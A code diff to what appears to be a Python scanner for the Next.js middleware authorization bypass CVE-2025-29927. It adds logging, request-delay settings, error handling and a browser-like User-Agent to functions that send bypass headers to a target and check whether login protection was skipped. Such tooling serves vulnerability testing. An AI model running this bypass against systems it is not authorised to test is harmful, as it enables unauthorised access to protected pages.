@@ -5,6 +5,7 @@ Tests the CVE-2025-29927 bypass using the x-middleware-subrequest header
 with multiple payloads and a 4-request consistency verification pattern.
 """
 
+import logging
 import time
 from dataclasses import dataclass
 from typing import Dict, List, Optional, Tuple
@@ -16,6 +17,15 @@ from requests.exceptions import RequestException
 from .models import BaselineResult, BypassResult, DifferenceResult, Confidence
 from .baseline import is_login_page
 
+
+# Configure logging
+logger = logging.getLogger(__name__)
+
+# Default delay between requests (seconds)
+# Can be increased for high-latency servers or CDN caching
+DEFAULT_REQUEST_DELAY = 0.1
+MIN_REQUEST_DELAY = 0.05
+MAX_REQUEST_DELAY = 2.0
 
 # Bypass payloads for different Next.js versions
 BYPASS_PAYLOADS = [
@@ -249,16 +259,28 @@ def test_bypass_payload(
     baseline: BaselineResult,
     session: requests.Session,
     timeout: int,
-    delay: float = 0.1
+    delay: float = DEFAULT_REQUEST_DELAY
 ) -> Tuple[bool, Optional[DifferenceResult], bool, str, List[RequestResult]]:
     """
     Test a single bypass payload with 4-request consistency check.
 
     Pattern: Normal -> Bypass -> Normal -> Bypass
 
+    Args:
+        url: Target URL to test
+        payload_name: Name of the payload being tested
+        payload_value: The x-middleware-subrequest header value
+        baseline: Baseline result from Phase 2
+        session: Requests session to use
+        timeout: Request timeout in seconds
+        delay: Delay between requests (default: 0.1s, range: 0.05-2.0s)
+
     Returns:
         Tuple of (works, difference, consistent, details, results)
     """
+    # Validate and clamp delay to safe range
+    delay = max(MIN_REQUEST_DELAY, min(delay, MAX_REQUEST_DELAY))
+
     results: List[RequestResult] = []
 
     # 4-request consistency test
@@ -273,7 +295,7 @@ def test_bypass_payload(
         )
         results.append(result)
 
-        # Small delay between requests
+        # Delay between requests to avoid rate limiting and cache issues
         if i < 3:
             time.sleep(delay)
 
@@ -312,7 +334,8 @@ def test_bypass(
     baseline: BaselineResult,
     session: Optional[requests.Session] = None,
     timeout: int = 10,
-    payloads: Optional[List[Tuple[str, str, str]]] = None
+    payloads: Optional[List[Tuple[str, str, str]]] = None,
+    delay: float = DEFAULT_REQUEST_DELAY
 ) -> BypassResult:
     """
     Phase 3: Test bypass with all payloads.
@@ -324,6 +347,7 @@ def test_bypass(
         session: Optional requests session
         timeout: Request timeout
         payloads: Optional custom payloads list
+        delay: Delay between requests (default: 0.1s)
 
     Returns:
         BypassResult with working payload and evidence
@@ -331,7 +355,7 @@ def test_bypass(
     if session is None:
         session = requests.Session()
         session.headers.update({
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
         })
 
     if payloads is None:
@@ -339,6 +363,7 @@ def test_bypass(
 
     url = urljoin(base_url, route)
     all_payloads_tested = []
+    last_error: Optional[str] = None
 
     for payload_name, payload_value, description in payloads:
         all_payloads_tested.append(payload_name)
@@ -350,7 +375,8 @@ def test_bypass(
                 payload_value=payload_value,
                 baseline=baseline,
                 session=session,
-                timeout=timeout
+                timeout=timeout,
+                delay=delay
             )
 
             if works and difference:
@@ -358,6 +384,7 @@ def test_bypass(
                 bypass_results = [r for r in results if r.with_bypass]
                 bypass_rep = bypass_results[0] if bypass_results else None
 
+                logger.info(f"Bypass successful with payload: {payload_name}")
                 return BypassResult(
                     works=True,
                     payload_name=payload_name,
@@ -372,15 +399,27 @@ def test_bypass(
                     bypass_content_sample=bypass_rep.content_sample if bypass_rep else ""
                 )
 
+        except RequestException as e:
+            # Log network errors but continue to next payload
+            logger.warning(f"Request error testing payload {payload_name}: {e}")
+            last_error = f"Request error: {type(e).__name__}"
+            continue
+
         except Exception as e:
-            # Continue to next payload on error
+            # Log unexpected errors for debugging
+            logger.error(f"Unexpected error testing payload {payload_name}: {e}", exc_info=True)
+            last_error = f"Error: {type(e).__name__}"
             continue
 
     # No working payload found
+    consistency_msg = "No working payload found"
+    if last_error:
+        consistency_msg += f" (last error: {last_error})"
+
     return BypassResult(
         works=False,
         all_payloads_tested=all_payloads_tested,
-        consistency_details="No working payload found"
+        consistency_details=consistency_msg
     )
 
 
@@ -389,19 +428,31 @@ def test_bypass_with_cache_busting(
     route: str,
     baseline: BaselineResult,
     session: Optional[requests.Session] = None,
-    timeout: int = 10
+    timeout: int = 10,
+    delay: float = DEFAULT_REQUEST_DELAY
 ) -> BypassResult:
     """
     Test bypass with cache-busting query parameters.
 
     Adds unique query params to avoid CDN cache interference.
+
+    Args:
+        base_url: Target base URL
+        route: Route to test
+        baseline: Baseline result from Phase 2
+        session: Optional requests session
+        timeout: Request timeout
+        delay: Delay between requests
+
+    Returns:
+        BypassResult with working payload and evidence
     """
     import uuid
 
     if session is None:
         session = requests.Session()
         session.headers.update({
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
             "Cache-Control": "no-cache",
             "Pragma": "no-cache"
         })
@@ -413,4 +464,4 @@ def test_bypass_with_cache_busting(
     else:
         route_with_bust = f"{route}?_cb={cache_bust}"
 
-    return test_bypass(base_url, route_with_bust, baseline, session, timeout)
+    return test_bypass(base_url, route_with_bust, baseline, session, timeout, delay=delay)
